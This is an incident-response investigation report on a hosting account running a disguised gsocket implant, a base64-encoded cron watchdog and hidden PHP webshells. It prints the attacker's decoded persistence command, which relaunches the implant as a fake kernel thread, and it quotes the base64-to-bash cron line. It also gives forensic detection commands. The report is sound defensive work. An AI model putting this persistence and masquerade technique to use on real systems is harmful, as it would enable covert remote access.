# Investigation

> Paths, account names, and process IDs are sanitized (the hosting account is shown as `webuser`; PIDs and exact dates are withheld to prevent de-anonymization). Command output is representative of the evidence observed while preserving the technical methodology.

## 1. Initial Detection — What Triggered the Investigation

The first signal was an **LFD resource alert** (backed by Imunify360) reporting sustained abnormal CPU/process-time usage attributed to the hosting account:

```
lfd on server01: Excessive resource usage: webuser (1001)
Time:  2025 (exact date withheld) +0800
Account: webuser
Resource: Process Time
Command Line: [slub_flushwq]
```

**Reasoning:** The offending process presented as `[slub_flushwq]` — a name crafted to look like a kernel *SLUB allocator flush workqueue*. Genuine kernel workqueue threads are children of `kthreadd` (PID 2), owned by root, and have **no on-disk executable**. A `[slub_flushwq]` attributed by LFD to an unprivileged hosting account (UID 1001) is a contradiction, and the first indicator of **process masquerading (T1036)**.

## 2. Process Analysis — Confirming the Masquerade

```bash
ps -ef | grep -i slub_flushwq
ls -l /proc/<pid>/exe        # <pid> withheld
```

```
webuser  <pid>  1  92  03:12  ?  06:41:22  [slub_flushwq]
lrwxrwxrwx 1 webuser webuser 0 2025 /proc/<pid>/exe -> /home/webuser/.config/htop/defunct
```

**Reasoning:** Three independent contradictions confirmed the masquerade: the process was **owned by `webuser`** (not root), had **PPID 1** (daemonized/orphaned, not parented by `kthreadd`), and — decisively — `/proc/<pid>/exe` resolved to a **real userland binary hidden under `.config/htop/`**, a directory chosen to blend in with legitimate htop configuration. Kernel threads never have such a symlink target.

```bash
file /home/webuser/.config/htop/defunct
strings /home/webuser/.config/htop/defunct | grep -i -E 'gs|sock|relay' | head
```

```
defunct: ELF 64-bit LSB executable, x86-64 (details withheld)
```

**Reasoning:** A second file, `defunct.dat`, sat beside the binary. Its role became clear from the persistence mechanism (below): it is the **gsocket secret key**.

## 3. Persistence — The Cron Watchdog

The hosting account's crontab held a single base64-encoded, hourly entry:

```bash
crontab -l -u webuser
```

```
0 * * * * echo <BASE64> | base64 -d | bash
```

Decoded, the payload is a **self-healing watchdog**:

```bash
/bin/pkill -0 -U1001 defunct 2>/dev/null \
  || SHELL= TERM=xterm-256color \
     GS_ARGS="-k /home/webuser/.config/htop/defunct.dat -liqD" \
     /bin/bash -c "exec -a '[slub_flushwq]' '/home/webuser/.config/htop/defunct'" 2>/dev/null
```

**Reasoning — line by line:**

- `pkill -0 -U1001 defunct` sends **signal 0** (an existence check, not a kill) for the implant owned by UID 1001. Because of the `||`, the relaunch only runs when the implant is **not** already active. Result: killing the process buys at most one hour before cron restarts it — which is why process termination alone never resolved the resource alerts.
- `exec -a '[slub_flushwq]'` overrides **argv[0]**, so the on-disk binary `defunct` presents in `ps`/`top` as the fake kernel thread. **This single flag is the entire masquerade mechanism (T1036).**
- `GS_ARGS="-k <keyfile> -liqD"` and the surrounding structure are **characteristic of gsocket / gs-netcat (Global Socket)** — a post-exploitation tool that brokers an encrypted connection through NAT/firewalls without opening a listening port. `-k defunct.dat` supplies the secret key.

**Assessment:** The implant is consistent with a **gsocket-based remote-access / C2 channel** rather than a simple cryptominer. (assessed from the `GS_ARGS` variable and flag structure in the persistence payload; not independently confirmed via hash attribution). Base64 wrapping of the cron line served only to defeat casual `crontab -l` review.

## 4. Webshell Hunt — The Delivery Mechanism

A C2 implant and cron entry imply an earlier code-execution foothold. The web root was swept for hidden and recently-modified PHP:

```bash
find /home/webuser/public_html -name ".*.php" | head
grep -rEl "eval\s*\(\s*(base64_decode|gzinflate|str_rot13)" /home/webuser/public_html
```

```
/home/webuser/public_html/<writable-cms-path-withheld>/.czech.php
<additional hits withheld>
```

**Reasoning:** The primary webshell recovered was **`.czech.php`** — a hidden, dot-prefixed PHP file that the leading `.` keeps out of default `ls` listings and casual file-manager views. Its placement in a writable CMS content path (exact directory withheld for anonymization) is consistent with delivery via a file-upload or code-execution weakness in a public-facing CMS component, rather than pre-existing administrative access. File modification timestamps were used to establish the deployment window and whether the drop was a single event or repeated.

## 5. Scoping — How Far Did It Go?

```bash
last | head
lastb | wc -l          # volume of failed SSH attempts
grep 'Accepted' /var/log/secure | tail
rpm -Va | grep -Ev '^\.{9}' | head
```

**Findings:**

- Heavy `lastb` volume showed continuous **SSH brute-force attempts**, automatically blocked by CSF; **no evidence they succeeded**.
- **RPM verification passed** — no system binaries were modified, indicating the compromise stayed within the `webuser` hosting account and did **not** escalate to root.

**Reasoning:** The scope was **account-level compromise without confirmed privilege escalation**. Findings are framed as "no evidence identified," not "did not occur."

## 6. Initial Access Assessment

The initial access vector was **not conclusively determined**:

- Most likely: **exploitation of a public-facing CMS component (T1190)** — consistent with the webshell landing in a writable CMS content path (specific vulnerable component withheld for anonymization).
- Considered and de-prioritized: **credential compromise (T1078)** — no anomalous accepted logins in retained auth logs.

**Reasoning:** Available log retention did not extend back to the earliest webshell activity, so the entry point is an assessment rather than a confirmed finding. Stating this explicitly avoids overclaiming root cause.

## 7. Summary of Findings

| # | Finding | Evidence | ATT&CK |
|---|---------|----------|--------|
| 1 | gsocket-style implant hidden in `.config/htop/` | `/proc/<PID>/exe`, `GS_ARGS` in cron | T1219 / T1564 |
| 2 | Process masquerading as `[slub_flushwq]` | `exec -a` in payload; `ps` owner/PPID | T1036 |
| 3 | Hourly self-healing cron watchdog | `crontab -l` (base64) | T1053.003 |
| 4 | Multi-wave hidden PHP webshells | `find` / `grep` sweeps, timestamps | T1505.003 |
| 5 | No privilege escalation identified | `rpm -Va`, auth-log review | — |

Remediation is documented in [05-Remediation.md](05-Remediation.md); detections that would have caught each stage earlier are in [10-Detection-Opportunities.md](10-Detection-Opportunities.md).
